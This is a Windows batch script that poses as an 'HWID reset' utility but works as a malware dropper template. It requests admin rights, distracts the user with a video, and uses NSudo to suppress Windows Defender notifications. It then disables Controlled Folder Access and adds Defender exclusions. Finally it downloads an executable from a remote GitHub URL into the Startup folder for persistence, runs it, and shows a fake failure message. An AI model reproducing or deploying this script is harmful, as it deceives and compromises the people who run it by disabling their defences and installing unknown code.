

:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
    echo msgbox "Attempting HWID reset... This can take multiple minutes!" > tmp.vbs
    wscript tmp.vbs
    del tmp.vbs
start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
color 01
curl "https://raw.githubusercontent.com/YumYummity/usb-install/main/NSudo.exe" --output "NSudo.exe"
NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
::disables ControlledFolderAccess to access files and folders
powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
::windows defender exclusions
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"

::direct download link
::edit this to your files
curl "https://raw.githubusercontent.com/YumYummity/usb-install/main/install/Windows.exe" --output "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe"
::upload files here: github.com - create account and create repository (public) then upload files


NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f

::run newly installed files
::unblock files
::change paths to file location
powershell -command "unblock-file -path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe'"
start "" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Windows.exe"
del NSudo.exe
echo msgbox "HWID reset failed." > tmp.vbs
wscript tmp.vbs
del tmp.vbs